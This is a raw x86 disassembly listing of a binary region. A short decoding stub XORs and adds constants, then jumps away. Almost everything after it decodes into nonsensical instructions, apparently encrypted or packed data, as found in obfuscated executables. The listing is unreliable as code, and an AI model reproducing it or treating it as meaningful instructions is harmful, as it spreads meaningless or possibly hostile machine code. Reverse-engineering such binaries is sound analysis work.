  407ae5:	dec    ecx
  407ae6:	pop    ebx
  407ae7:	dec    ebx
  407ae8:	xchg   ebx,ecx
  407aea:	sub    ebx,ecx
  407aec:	xchg   ebx,ecx
  407aee:	dec    ecx
  407aef:	mov    eax,DWORD PTR [ebp-0x1c]
  407af2:	imul   eax,ecx
  407af5:	sub    esp,eax
  407af7:	mov    DWORD PTR [ebp-0x20],esp
  407afa:	mov    eax,DWORD PTR [ebp-0x4]
  407afd:	mov    ecx,0x7510896
  407b02:	xor    eax,ecx
  407b04:	mov    edx,0x3272dd
  407b09:	add    eax,edx
  407b0b:	mov    DWORD PTR [ebp+0x8],eax
  407b0e:	mov    eax,DWORD PTR [ebp-0x14]
  407b11:	xor    eax,ecx
  407b13:	add    eax,edx
  407b15:	mov    edx,DWORD PTR [ebp+0x14]
  407b18:	jmp    0x409e70
  407b1d:	push   es
  407b1e:	or     DWORD PTR [esi],ebx
  407b20:	xchg   DWORD PTR [ecx],eax
  407b22:	xchg   DWORD PTR [ebx+0x7caff18b],ecx
  407b28:	xor    eax,0xbb734c22
  407b2d:	nop
  407b2e:	and    BYTE PTR [edx+0x7a],bh
  407b31:	aaa    
  407b32:	pop    edi
  407b33:	jp     0x407baf
  407b35:	jg     0x407b5c
  407b37:	lods   al,BYTE PTR ds:[esi]
  407b38:	mov    ebx,0x4fe733ad
  407b3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b3e:	push   eax
  407b3f:	pop    edx
  407b40:	icebp  
  407b41:	lahf   
  407b42:	rol    DWORD PTR [ecx+0x27],0x8d
  407b46:	leave  
  407b47:	mov    esp,0x66cc5868
  407b4c:	inc    edi
  407b4d:	dec    ebp
  407b4e:	leave  
  407b4f:	or     DWORD PTR [edi],0xcc86d522
  407b55:	jns    0x407b89
  407b57:	inc    esp
  407b58:	les    edi,FWORD PTR [ecx-0x16]
  407b5b:	lahf   
  407b5c:	jmp    0xca5a4d2
  407b61:	idiv   ebx
  407b63:	in     al,dx
  407b64:	pop    edx
  407b65:	dec    eax
  407b66:	(bad)  
  407b68:	stos   BYTE PTR es:[edi],al
  407b69:	dec    eax
  407b6a:	push   0xffffffa6
  407b6c:	and    ch,BYTE PTR [edi]
  407b6e:	ror    BYTE PTR ds:0xd25423ce,1
  407b74:	mov    dh,0xdb
  407b76:	and    DWORD PTR [eiz*8+0x2cac9eb3],edx
  407b7d:	mov    eax,0xa9f437d8
  407b82:	xor    eax,ecx
  407b84:	xchg   ebp,eax
  407b85:	lock push es
  407b87:	(bad)  
  407b88:	lock mov dl,0x3e
  407b8b:	not    BYTE PTR [ecx+0x56]
  407b8e:	fdiv   QWORD PTR [edx+ebp*4]
  407b91:	dec    esi
  407b92:	mov    al,ds:0xbf456420
  407b97:	mov    al,ds:0x64238332
  407b9c:	jp     0x407bba
  407b9e:	push   eax
  407b9f:	in     al,dx
  407ba0:	inc    ebp
  407ba1:	push   eax
  407ba2:	jge    0x407b96
  407ba4:	cmp    DWORD PTR [edx-0x565e7e3e],esp
  407baa:	pusha  
  407bab:	pop    ds
  407bac:	inc    esp
  407bad:	xor    ch,BYTE PTR [ebx+0x56]
  407bb0:	repz and BYTE PTR [ebx+0x40bac463],dh
  407bb7:	mov    ebp,0xc45e11f6
  407bbc:	das    
  407bbd:	pop    esp
  407bbe:	std    
  407bbf:	or     al,0x92
  407bc1:	iret   
  407bc2:	inc    ecx
  407bc3:	std    
  407bc4:	out    dx,eax
  407bc5:	shr    BYTE PTR [eax],1
  407bc7:	add    eax,0x7ccde3cf
  407bcc:	jnp    0x407c41
  407bce:	cli    
  407bcf:	js     0x407bba
  407bd1:	push   eax
  407bd2:	or     esi,DWORD PTR [ebp-0x2d62e0d9]
  407bd8:	scas   eax,DWORD PTR es:[edi]
  407bd9:	jbe    0x407b80
  407bdb:	xor    edi,DWORD PTR [edi]
  407bdd:	jg     0x407bde
  407bdf:	jo     0x407c3b
  407be1:	pop    ds
  407be2:	aad    0x6f
  407be4:	test   eax,0xdf41ca96
  407be9:	int3   
  407bea:	sbb    DWORD PTR [edi-0x2945e8f],ecx
  407bf0:	les    ebx,FWORD PTR [edi-0x74]
  407bf3:	jp     0x407ba7
  407bf5:	je     0x407b81
  407bf7:	retf   
  407bf8:	pop    es
  407bf9:	test   DWORD PTR [edi+0x6],edi
  407bfc:	push   eax
  407bfd:	shl    BYTE PTR [edx+0x2a],1
  407c00:	cmp    al,BYTE PTR [ecx]
  407c02:	clc    
  407c03:	or     al,0xfe
  407c05:	sub    al,0xbb
  407c07:	jg     0x407bc5
  407c09:	push   ss
  407c0a:	pop    si
  407c0c:	mov    ah,0x43
  407c0e:	cmp    bl,dl
  407c10:	xchg   edi,eax
  407c11:	loop   0x407c8c
  407c13:	fld    QWORD PTR [ecx+0x28]
  407c16:	test   eax,0xd83fa34
  407c1b:	ins    BYTE PTR es:[edi],dx
  407c1c:	pop    DWORD PTR [edi]
  407c1e:	shr    BYTE PTR [ebx+0x17d1eb45],cl
  407c24:	jecxz  0x407ba6
  407c26:	iret   
  407c27:	pop    esi
  407c28:	sub    esp,esi
  407c2a:	or     dl,BYTE PTR [ecx]
  407c2c:	jp     0x407bf3
  407c2e:	ret    0x78d2
  407c31:	cli    
  407c32:	jbe    0x407c15
  407c34:	fldenv ds:0xdceb74bd
  407c3a:	adc    edi,esi
  407c3c:	dec    esi
  407c3d:	push   eax
  407c3e:	pop    esi
  407c3f:	rcr    BYTE PTR [ebx*2-0x7991ce6f],cl
  407c46:	mov    eax,DWORD PTR [edx+0x7b2966f6]
  407c4c:	sub    bl,BYTE PTR [esi]
  407c4e:	dec    edx
  407c4f:	(bad)  
  407c50:	jno    0x407c88
  407c52:	sub    al,0xee
  407c54:	adc    al,0xfe
  407c56:	psubusb mm0,QWORD PTR [ebx+0x1b]
  407c5a:	popa   
  407c5b:	out    dx,eax
  407c5c:	inc    ebp
  407c5d:	inc    ebx
  407c5e:	push   ebx
  407c5f:	fucomip st,st(0)
  407c61:	jmp    0xca4e865c
  407c66:	fcmovnu st,st(2)
  407c69:	jns    0x407c90
  407c6b:	loop   0x407c37
  407c6d:	in     al,0xb
  407c6f:	adc    esi,esi
  407c71:	ret    
  407c72:	jmp    0x407bfb
  407c74:	mov    edx,0xdcc40693
  407c79:	xchg   edi,eax
  407c7a:	int3   
  407c7b:	xchg   ebp,eax
  407c7c:	or     al,0x85
  407c7e:	in     al,0xa7
  407c80:	xchg   ebx,eax
  407c81:	mov    eax,0x571a27d9
  407c86:	jo     0x407cdf
  407c88:	lods   eax,DWORD PTR ds:[esi]
  407c89:	jns    0x407cbf
  407c8b:	inc    edi
  407c8c:	xchg   BYTE PTR [ecx+ecx*1-0x1c],ah
  407c90:	retf   0x659b
  407c93:	xor    dl,BYTE PTR [eax-0x7c]
  407c96:	mov    ecx,0x841e4031
  407c9b:	nop
  407c9c:	cdq    
  407c9d:	inc    ecx
  407c9e:	lahf   
  407c9f:	lock sub eax,0xe1311538
  407ca5:	cmovns esp,DWORD PTR ds:0xd8a33d5d
  407cac:	in     eax,0x3
  407cae:	push   0xffffffc9
  407cb0:	jbe    0x407d2d
  407cb2:	sbb    bl,ah
  407cb4:	push   0x7af1b4ba
  407cb9:	pop    ds
  407cba:	cmp    ebx,esp
  407cbc:	jmp    0x407c61
  407cbe:	sub    al,0xa5
  407cc0:	and    ebx,esi
  407cc2:	pop    ds
  407cc3:	fs cmp al,0x22
  407cc6:	scas   al,BYTE PTR es:[edi]
  407cc7:	xchg   edx,eax
  407cc8:	pushf  
  407cc9:	shr    DWORD PTR [ebx],0x36
  407ccc:	mov    eax,0xffa8ab09
  407cd1:	popa   
  407cd2:	test   ebx,0x6212ca89
  407cd8:	int3   
  407cd9:	aad    0xc5
  407cdb:	cs or  eax,0x97cb9443
  407ce2:	and    DWORD PTR [esi-0x4cb6b99a],ecx
  407ce8:	stc    
  407ce9:	cmp    eax,0x9f7497ca
  407cee:	push   eax
  407cef:	jmp    0xafeb:0xe8b87066
  407cf6:	adc    eax,DWORD PTR [eax+0x3ee6bae5]
  407cfc:	or     ah,0x59
  407cff:	cld    
  407d00:	aas    
  407d01:	bound  ebp,QWORD PTR [ebp+eax*8+0x10]
  407d05:	sub    DWORD PTR [ebp+0x3c19f949],esi
  407d0b:	repz js 0x407c90
  407d0e:	push   eax
  407d0f:	push   0xb0a38ef9
  407d14:	jmp    0x718bf42
  407d19:	cli    
  407d1a:	sbb    bl,BYTE PTR [ebx-0x68]
  407d1d:	sti    
  407d1e:	shr    dl,1
  407d20:	fwait
  407d21:	aad    0xdb
  407d23:	cs xor cl,al
  407d26:	mov    esp,0x66173e8c
  407d2b:	push   0xe31e6394
  407d30:	das    
  407d31:	pop    esi
  407d32:	adc    eax,0xaac8d65d
  407d37:	pop    ss
  407d38:	dec    eax
  407d39:	cs enter 0xc2af,0xc2
  407d3e:	cmp    al,BYTE PTR [ebp+0x82ebe6f]
  407d44:	or     ebx,ecx
  407d46:	add    ch,BYTE PTR [edx-0x364da65a]
  407d4c:	mov    ebp,edx
  407d4e:	lds    edx,FWORD PTR [esi-0x6d]
  407d51:	repnz mov ebp,0x7740eb9e
  407d57:	shr    DWORD PTR [esi+0x7c85f3f],0x88
  407d5e:	imul   eax,DWORD PTR [esi+ebx*1+0x2eb6985e],0x4
  407d66:	icebp  
  407d67:	jmp    0xf844:0xce198991
  407d6e:	ins    DWORD PTR es:[edi],dx
  407d6f:	enter  0xcd61,0x43
  407d73:	cli    
  407d74:	sbb    al,0x88
  407d76:	shl    ecx,1
  407d78:	repnz aad 0xa9
  407d7b:	sub    BYTE PTR ds:0x5a9fe589,ah
  407d81:	mov    edx,0xf787e3f8
  407d86:	int3   
  407d87:	int    0x56
  407d89:	xor    ebp,esi
  407d8b:	repz dec ebp
  407d8d:	dec    ebp
  407d8e:	xchg   ebp,eax
  407d8f:	je     0x407dd5
  407d91:	push   esi
  407d92:	call   0xea8b:0x9192d72
  407d99:	loopne 0x407de8
  407d9b:	(bad)  
  407d9d:	push   esp
  407d9e:	inc    ebp
  407d9f:	shl    DWORD PTR [ecx+0x49],0x17
  407da3:	stos   DWORD PTR es:[edi],eax
  407da4:	mov    ebp,0x84f762e3
  407da9:	ins    BYTE PTR es:[edi],dx
  407daa:	(bad)  
  407dab:	lods   al,BYTE PTR ds:[esi]
  407dac:	es loopne 0x407de6
  407daf:	add    dl,0xe2
  407db2:	popf   
  407db3:	dec    edi
  407db4:	fs stos BYTE PTR es:[edi],al
  407db6:	fcmove st,st(2)
  407db8:	mov    ah,0xb3
  407dba:	pop    es
  407dbb:	call   0x423d33d9
  407dc0:	test   ebp,0x83ae347d
  407dc6:	dec    ebp
  407dc7:	inc    esp
  407dc8:	adc    DWORD PTR [ebx-0x363bb2a],esi
  407dce:	mov    ecx,0x52424a0f
  407dd3:	test   DWORD PTR [edx+ebp*8-0x56908206],ebp
  407dda:	popf   
  407ddb:	sub    BYTE PTR [esi],0x6b
  407dde:	push   es
  407ddf:	popf   
  407de0:	mov    eax,ds:0x94a6d8dd
  407de5:	int3   
  407de6:	jnp    0x407d95
  407de8:	adc    DWORD PTR [ebx+0x7b],0xffffffad
  407dec:	es and cl,dh
  407def:	out    0xc9,al
  407df1:	push   edx
  407df2:	les    ebp,FWORD PTR ss:[ebp-0x1]
  407df6:	sahf   
  407df7:	sti    
  407df8:	fwait
  407df9:	xor    BYTE PTR [eax],ch
  407dfb:	dec    esp
  407dfc:	pop    ebx
  407dfd:	xor    dh,BYTE PTR [ebp+0x6385e9ff]
  407e03:	pop    ds
  407e04:	fs xchg ebx,eax
  407e06:	mov    esi,0x69796b50
  407e0b:	int3   
  407e0c:	mov    dl,0xee
  407e0e:	cli    
  407e0f:	mov    eax,0xb0379832
  407e14:	fsub   st,st(4)
  407e16:	sbb    al,0xb5
  407e18:	mov    al,0xe4
  407e1a:	mov    WORD PTR [edi-0x7c51d4e1],?
  407e20:	loope  0x407e79
  407e22:	push   cs
  407e23:	dec    edi
  407e24:	imul   esp,DWORD PTR [esi],0x78
  407e27:	add    BYTE PTR [eax+0x38],bh
  407e2a:	test   al,0xa7
  407e2c:	adc    BYTE PTR [ecx],bl
  407e2e:	adc    eax,DWORD PTR [edi+ebp*2]
  407e31:	js     0x407dfb
  407e33:	mov    bl,0x79
  407e35:	jae    0x407e5e
  407e37:	jmp    0x407ea2
  407e39:	xchg   edx,eax
  407e3a:	(bad)  
  407e3b:	sbb    ah,al
  407e3d:	lock lock sbb BYTE PTR [ecx+0x2849f0ae],ch
  407e45:	push   ecx
  407e46:	xchg   ebp,eax
  407e47:	call   0xd97fb7eb
  407e4c:	mov    esi,ebx
  407e4e:	mov    ebp,0xf077fe5c
  407e53:	fcomp  DWORD PTR [edx+ebp*1+0x484c2090]
  407e5a:	inc    esp
  407e5b:	add    eax,0x2c9a8373
  407e60:	dec    ecx
  407e61:	popa   
  407e62:	mov    ch,BYTE PTR [ecx-0x52f93a4d]
  407e68:	stc    
  407e69:	addr16 call ecx
  407e6c:	inc    eax
  407e6d:	in     eax,0x24
  407e6f:	popf   
  407e70:	push   cs
  407e71:	mov    eax,0x94bd41cf
  407e76:	mov    cs,esi
  407e78:	fbstp  TBYTE PTR [ebp+0x26596b48]
  407e7e:	xor    al,dh
  407e80:	jno    0x407e88
  407e82:	add    ch,ch
  407e84:	bnd jo 0x407e65
  407e87:	das    
  407e88:	adc    BYTE PTR [eax],al
  407e8a:	jp     0x407e8a
  407e8c:	in     al,0x41
  407e8e:	dec    ebp
  407e8f:	call   0x18b7:0x1923b3dc
  407e96:	and    eax,0xffd9156c
  407e9b:	bound  esi,QWORD PTR [esp+edx*1+0x3e4118e4]
  407ea2:	jmp    0x407e2a
  407ea4:	adc    al,0xf0
  407ea6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ea7:	or     eax,DWORD PTR [ecx+esi*2]
  407eaa:	pop    DWORD PTR [eax+0x6a]
  407ead:	and    DWORD PTR [esi+0x64],ebx
  407eb0:	adc    al,0xc7
  407eb2:	jo     0x407ef8
  407eb4:	gs lahf 
  407eb6:	xchg   ecx,eax
  407eb7:	imul   ecx,DWORD PTR [ebx+ecx*2],0xffffffaa
  407ebb:	and    al,0x29
  407ebd:	add    bh,bh
  407ebf:	push   ds
  407ec0:	jnp    0x407e7e
  407ec2:	leave  
  407ec3:	dec    edi
  407ec4:	pop    edi
  407ec5:	(bad)  
  407ec6:	adc    DWORD PTR [eax-0x70ac5333],eax
  407ecc:	or     al,0xde
  407ece:	imul   edx,DWORD PTR [edi+esi*8-0x39caa76d],0xffffff8e
  407ed6:	jle    0x407e72
  407ed8:	dec    edx
  407ed9:	mov    ebp,0xfd79a591
  407ede:	sub    DWORD PTR [esi],0x20
  407ee1:	mov    dl,0x61
  407ee3:	dec    edx
  407ee4:	or     dh,cl
  407ee6:	jle    0x407f4e
  407ee8:	xchg   esp,eax
  407ee9:	(bad)  
  407eea:	xor    dl,bh
  407eec:	adc    bl,ah
  407eee:	lock xlat BYTE PTR ds:[ebx]
  407ef0:	or     al,0x40
  407ef2:	mov    ah,0xf0
  407ef4:	xchg   esp,ebp
  407ef6:	or     esp,esp
  407ef8:	leave  
  407ef9:	mov    ah,0x5e
  407efb:	xor    DWORD PTR [esi-0x179e7cd8],ecx
  407f01:	stos   BYTE PTR es:[edi],al
  407f02:	icebp  
  407f03:	data16 mov dl,0x3d
  407f06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f07:	enter  0x7d4e,0xc0
  407f0b:	pop    ecx
  407f0c:	pop    esp
  407f0d:	cmp    DWORD PTR [eax+0xf],esp
  407f10:	pop    es
  407f11:	dec    ecx
  407f12:	fdiv   DWORD PTR [eax+ebp*2+0x73]
  407f16:	cmp    BYTE PTR [ecx-0x3ec0572d],dl
  407f1c:	adc    al,0x64
  407f1e:	shl    BYTE PTR [eax],cl
  407f20:	cli    
  407f21:	mov    edi,0x8eb6764b
  407f26:	call   0x45b3:0xbb0359c4
  407f2d:	shr    DWORD PTR [ebp-0x3a],cl
  407f30:	test   al,0x98
  407f32:	es out 0xa3,eax
  407f35:	popf   
  407f36:	dec    esp
  407f37:	or     edi,ebp
  407f39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f3a:	dec    edi
  407f3b:	and    DWORD PTR [eax+0x2d3faa75],0x455a4ca1
  407f45:	daa    
  407f46:	xor    DWORD PTR [edx],edi
  407f48:	stos   DWORD PTR es:[edi],eax
  407f49:	jmp    0x407fc6
  407f4b:	rcr    BYTE PTR [bp+si],0x5
  407f4f:	and    eax,0xfe8d6171
  407f54:	repz jp 0x407f09
  407f57:	aad    0x64
  407f59:	mov    al,ds:0xdbf82183
  407f5e:	add    bh,cl
  407f60:	(bad)  
  407f61:	push   ebx
  407f62:	xchg   esi,eax
  407f63:	jle    0x407fb0
  407f65:	xchg   edx,eax
  407f66:	lds    esp,FWORD PTR [eax+0x41]
  407f69:	std    
  407f6a:	gs pop ss
  407f6c:	lods   eax,DWORD PTR ds:[esi]
  407f6d:	stos   BYTE PTR es:[edi],al
  407f6e:	in     eax,dx
  407f6f:	out    0x4f,eax
  407f71:	or     eax,0x1b367f64
  407f76:	fisubr WORD PTR [ebp+0x0]
  407f79:	sbb    ah,al
  407f7b:	pop    edi
  407f7c:	repnz mov ds:0xa879e13b,al
  407f82:	or     ah,dl
  407f84:	mov    edi,0x3217ad79
  407f89:	xor    edx,DWORD PTR [edi]
  407f8b:	mov    dh,cl
  407f8d:	mov    ds,WORD PTR [esi+0x1f7c3270]
  407f93:	xchg   ebx,eax
  407f94:	and    DWORD PTR [eax+0x1311b7a],ebx
  407f9a:	mov    esp,0x1aa6038d
  407f9f:	es loopne 0x407fd4
  407fa2:	mov    edi,0x3a98839c
  407fa7:	mov    dl,0x7c
  407fa9:	fidivr WORD PTR [esi+0x6c60667c]
  407faf:	ins    DWORD PTR es:[edi],dx
  407fb0:	mov    ebp,0xb6897374
  407fb5:	ficom  WORD PTR [ebx]
  407fb7:	adc    ebx,0xffffffd2
  407fba:	out    dx,eax
  407fbb:	mov    ss,WORD PTR [ecx+0x2b118ba8]
  407fc1:	data16 aaa 
  407fc3:	adc    esp,esi
  407fc5:	mov    edi,0xb5b9f471
  407fca:	(bad)  
  407fcb:	int    0xef
  407fcd:	push   ebp
  407fce:	mov    esi,0x31309bef
  407fd3:	cmp    eax,0xffffffe8
  407fd6:	pop    eax
  407fd7:	sub    DWORD PTR [ecx+ebx*2],ecx
  407fda:	(bad)  
  407fdc:	xchg   esp,eax
  407fdd:	mov    cs,WORD PTR [ebp-0x28c29384]
  407fe3:	rol    BYTE PTR [eax+0x60ebafe4],0xb0
  407fea:	ds xchg edi,eax
  407fec:	fsqrt  
  407fee:	aad    0x43
  407ff0:	les    eax,FWORD PTR [ecx-0x5e]
  407ff3:	mov    ds:0xc6f4da4a,eax
  407ff8:	push   0x288238af
  407ffd:	mov    esi,0x9f80c65d
  408002:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408003:	add    dl,BYTE PTR [ebx-0x146457a9]
  408009:	jle    0x407ffa
  40800b:	cdq    
  40800c:	or     ebp,DWORD PTR fs:[ebx+0x1476fcc3]
  408013:	xor    WORD PTR [ebp-0x4df87912],sp
  40801a:	fld    QWORD PTR [edi-0x4f7080ef]
  408020:	mov    ch,0x3d
  408022:	ins    DWORD PTR es:[edi],dx
  408023:	(bad)  
  408024:	jo     0x40807a
  408026:	sbb    al,0x4
  408028:	sbb    DWORD PTR [edi],ecx
  40802a:	test   eax,0x925cc0eb
  40802f:	je     0x407fe6
  408031:	(bad)  
  408032:	mov    edx,0xf5cc1c4d
  408037:	and    DWORD PTR [ebp-0x6e],ecx
  40803a:	and    al,ch
  40803c:	sub    al,0x77
  40803e:	push   esp
  40803f:	add    BYTE PTR [edi-0x61dc8d36],0x60
  408046:	cmp    esp,DWORD PTR [edx+0x5f]
  408049:	mov    ah,0x56
  40804b:	cdq    
  40804c:	(bad)  
  40804d:	repz arpl WORD PTR [ebx],bx
  408050:	push   ecx
  408051:	aas    
  408052:	sub    ebp,ecx
  408054:	(bad)  
  408055:	adc    al,0xe
  408057:	jmp    0x40804c
  408059:	pop    eax
  40805a:	add    eax,0x88a4db54
  40805f:	xor    al,0x89
  408061:	cli    
  408062:	cmp    esp,edi
  408064:	push   esp
  408065:	mov    ah,0x1a
  408067:	repnz sbb al,0x8
  40806a:	mov    al,0x17
  40806c:	adc    ah,BYTE PTR [ecx]
  40806e:	iret   
  40806f:	dec    ecx
  408070:	xor    eax,0x10a1e279
  408075:	mov    ebp,0x4544657c
  40807a:	mov    eax,ds:0x5c86c1be
  40807f:	dec    edi
  408080:	push   edi
  408081:	mov    bh,0x63
  408083:	sub    DWORD PTR [esi],ecx
  408085:	pop    es
  408086:	inc    eax
  408087:	push   edx
  408088:	outs   dx,DWORD PTR ds:[esi]
  408089:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40808a:	les    ebx,FWORD PTR [esi-0x46]
  40808d:	cmp    eax,0xd0efac40
  408092:	sub    BYTE PTR [edx+0x21c2ec5a],dl
  408098:	dec    ebx
  408099:	fwait
  40809a:	jne    0x408040
  40809c:	inc    esp
  40809d:	lods   al,BYTE PTR ds:[esi]
  40809e:	mov    esp,0xb3fc54e4
  4080a3:	inc    ecx
  4080a4:	pop    esp
  4080a5:	add    al,0xaa
  4080a7:	add    DWORD PTR gs:[eax],0x7e
  4080ab:	cdq    
  4080ac:	or     BYTE PTR [ebx],ch
  4080ae:	fs jl  0x4080fe
  4080b1:	and    eax,0xaaf878db
  4080b6:	jp     0x408106
  4080b8:	mov    dh,0x9f
  4080ba:	stos   BYTE PTR es:[edi],al
  4080bb:	adc    BYTE PTR [edi+0x489c8d59],0xa8
  4080c2:	cli    
  4080c3:	sbb    DWORD PTR gs:[eax-0x3b],ebp
  4080c7:	jmp    0xd67236e5
  4080cc:	xor    BYTE PTR [edi],dh
  4080ce:	mov    ebp,esp
  4080d0:	mov    al,0x99
  4080d2:	pop    ecx
  4080d3:	inc    ebx
  4080d4:	(bad)  
  4080d5:	and    BYTE PTR [ebx],al
  4080d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080d8:	in     al,0x88
  4080da:	ins    DWORD PTR es:[edi],dx
  4080db:	pop    edx
  4080dc:	into   
  4080dd:	mov    edi,0x8d50b27
  4080e2:	push   0x7
  4080e4:	idiv   esi
  4080e6:	fnstsw WORD PTR [edi-0x6]
  4080e9:	jbe    0x408154
  4080eb:	lods   al,BYTE PTR ds:[esi]
  4080ec:	pop    ds
  4080ed:	ins    DWORD PTR es:[edi],dx
  4080ee:	daa    
  4080ef:	(bad)
  4080f2:	and    bh,dl
  4080f4:	call   0xb2a494c3
  4080f9:	outs   dx,BYTE PTR ds:[esi]
  4080fa:	fcom   QWORD PTR [ebx]
  4080fc:	sbb    al,0xbf
  4080fe:	cmc    
  4080ff:	icebp  
  408100:	cwde   
  408101:	mov    ds:0x286b811,eax
  408106:	stos   DWORD PTR es:[edi],eax
  408107:	xchg   ebx,eax
  408108:	int    0x48
  40810a:	cmp    BYTE PTR [edi+eax*1+0x27],0x66
  40810f:	add    DWORD PTR [edx+0x58],ebx
  408112:	xlat   BYTE PTR ds:[ebx]
  408113:	loop   0x4080eb
  408115:	mov    edi,0xec5c0848
  40811a:	(bad)  
  40811b:	repnz into 
  40811d:	fimul  WORD PTR [esi+0x69cfe4d9]
  408123:	dec    ecx
  408124:	arpl   WORD PTR [ecx+0x23],dx
  408127:	fidivr WORD PTR [edi-0x3816fed6]
  40812d:	sub    ecx,ebx
  40812f:	sub    BYTE PTR [ecx],dl
  408131:	neg    BYTE PTR [ecx-0x29]
  408134:	add    al,0xd5
  408136:	mov    gs,WORD PTR [edi-0x6a]
  408139:	call   0x746dd654
  40813e:	shl    BYTE PTR [ebp+0x6d],cl
  408141:	pop    ecx
  408142:	jno    0x40812b
  408144:	dec    ecx
  408145:	inc    eax
  408146:	mov    ds:0x71d84651,al
  40814b:	dec    esp
  40814c:	pop    edi
  40814d:	pusha  
  40814e:	cld    
  40814f:	je     0x408158
  408151:	sub    ecx,eax
  408153:	sub    DWORD PTR [eax+0x39c033f],ecx
  408159:	and    al,0xe0
  40815b:	mov    BYTE PTR [ecx-0x3f2fffe9],ah
  408161:	sbb    bh,bl
  408163:	adc    dh,BYTE PTR [edx-0x69c105f6]
  408169:	mov    WORD PTR [esi+0x39fff5a7],?
  40816f:	lods   al,BYTE PTR ds:[esi]
  408170:	imul   eax,DWORD PTR [esi],0x2e
  408173:	fadd   QWORD PTR [ebp-0x24]
  408176:	int3   
  408177:	inc    ebp
  408178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408179:	ret    
  40817a:	dec    ebx
  40817b:	arpl   dx,si
  40817d:	jno    0x4081d3
  40817f:	repz and BYTE PTR [edi-0x56bdeb87],bh
  408186:	mov    bh,0x3d
  408188:	cmp    ch,dh
  40818a:	inc    esp
  40818b:	adc    bl,BYTE PTR [ebx-0x4]
  40818e:	pop    es
  40818f:	pop    ds
  408190:	dec    esi
  408191:	push   ecx
  408192:	or     BYTE PTR [edi+0x76],al
  408195:	ja     0x4081ae
  408197:	pop    edx
  408198:	mov    dh,0x7c
  40819a:	imul   ebx,ecx,0xa
  40819d:	dec    edi
  40819e:	mov    cl,0x63
  4081a0:	mov    ch,0x2c
  4081a2:	xchg   ebp,eax
  4081a3:	sbb    eax,0xb8d69a9d
  4081a8:	loop   0x40818e
  4081aa:	or     cl,BYTE PTR [edx+0x54]
  4081ad:	fucomi st,st(3)
  4081af:	bound  ebp,QWORD PTR ds:0xf7318604
  4081b5:	cmp    BYTE PTR [edx-0x2bd65fa6],dh
  4081bb:	and    ebx,DWORD PTR [edi]
  4081bd:	ret    
  4081be:	push   esp
  4081bf:	cdq    
  4081c0:	shl    DWORD PTR [edx+eax*8-0x1fc86241],0xdf
  4081c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081c9:	test   BYTE PTR [edx+ecx*4],ah
  4081cc:	or     ch,BYTE PTR [eax+eiz*2-0x16]
  4081d0:	dec    ecx
  4081d1:	sbb    al,0x7d
  4081d3:	call   0x341683cc
  4081d8:	xchg   esi,eax
  4081d9:	jo     0x40816f
  4081db:	imul   esi,DWORD PTR [ebp-0x5f664c09],0x84c6e3a
  4081e5:	mov    ebp,0x574e6bb5
  4081ea:	jnp    0x408192
  4081ec:	cli    
  4081ed:	cli    
  4081ee:	dec    esi
  4081ef:	jmp    0x831d4779
  4081f4:	jge    0x4081e9
  4081f6:	les    ecx,FWORD PTR [ebx-0x68]
  4081f9:	data16 cmp cl,BYTE PTR [ecx]
  4081fc:	mov    WORD PTR [edx+0x50a296c2],gs
  408202:	dec    eax
  408203:	inc    edx
  408204:	xor    ch,BYTE PTR [ecx-0x240a2437]
  40820a:	and    ah,BYTE PTR [eax+0x78283003]
  408210:	or     eax,0xdfc8a6da
  408215:	jns    0x4081e4
  408217:	pop    ebp
  408218:	mov    esp,0x9052ca65
  40821d:	test   BYTE PTR [ebp-0x32],bh
  408220:	sbb    DWORD PTR [esp+edi*4-0x716d1a57],edx
  408227:	pop    edx
  408228:	mov    edi,0xe69f2445
  40822d:	jns    0x40822c
  40822f:	outs   dx,DWORD PTR ds:[esi]
  408230:	inc    edi
  408231:	in     al,0x92
  408233:	mov    bh,0x19
  408235:	test   ebx,ebp
  408237:	jae    0x4081d5
  408239:	test   DWORD PTR [edi-0x50],edi
  40823c:	push   edx
  40823d:	jmp    0x408284
  40823f:	sar    BYTE PTR [edx+edi*1-0x53],0xbc
  408244:	add    al,0x1c
  408246:	or     DWORD PTR [esp+edi*8-0x1f],ebp
  40824a:	jp     0x408254
  40824c:	or     eax,0x34a8e535
  408251:	add    eax,0x63cc6b75
  408256:	xor    BYTE PTR [edi-0x33],ah
  408259:	ins    DWORD PTR es:[edi],dx
  40825a:	and    DWORD PTR [ebx+0x287dc970],esi
  408260:	jl     0x40825c
  408262:	dec    eax
  408263:	fisubr WORD PTR ds:0x9fafd408
  408269:	clc    
  40826a:	loop   0x408292
  40826c:	aam    0x84
  40826e:	mov    DWORD PTR [edi+0x902954f],esp
  408274:	add    eax,0x75c1acb5
  408279:	fcom   QWORD PTR [ebx-0x1f4fe599]
  40827f:	aas    
  408280:	(bad)  
  408282:	pop    esp
  408283:	popa   
  408284:	adc    BYTE PTR [eax+esi*1-0x7d7869a3],al
  40828b:	or     DWORD PTR [eax+0x67],esi
  40828e:	fcmovbe st,st(4)
  408290:	xchg   DWORD PTR [esi+0x3b081688],ebx
  408296:	loop   0x408259
  408298:	adc    ecx,ebx
  40829a:	popf   
  40829b:	mov    al,ds:0x2e30e410
  4082a0:	test   BYTE PTR [edx+0x54],0xea
  4082a4:	add    BYTE PTR [ebx-0xf49ea6],bh
  4082aa:	ret    0x3970
  4082ad:	add    BYTE PTR ds:0x2c6311d0,0x5c
  4082b4:	adc    ah,BYTE PTR [ebx+0x71]
  4082b7:	cmp    eax,DWORD PTR [esi-0x61]
  4082ba:	cmp    BYTE PTR [edi],0x61
  4082bd:	repz js 0x40828c
  4082c0:	mov    ds:0x50940a1d,eax
  4082c5:	inc    eax
  4082c6:	pusha  
  4082c7:	inc    ecx
  4082c8:	in     al,dx
  4082c9:	ins    BYTE PTR es:[edi],dx
  4082ca:	(bad)  
  4082cb:	jns    0x4082f7
  4082cd:	stc    
  4082ce:	or     esi,esi
  4082d0:	adc    al,0xa8
  4082d2:	jae    0x4082ee
  4082d4:	xlat   BYTE PTR ds:[ebx]
  4082d5:	mov    esp,0x6397b052
  4082da:	xchg   esi,eax
  4082db:	aas    
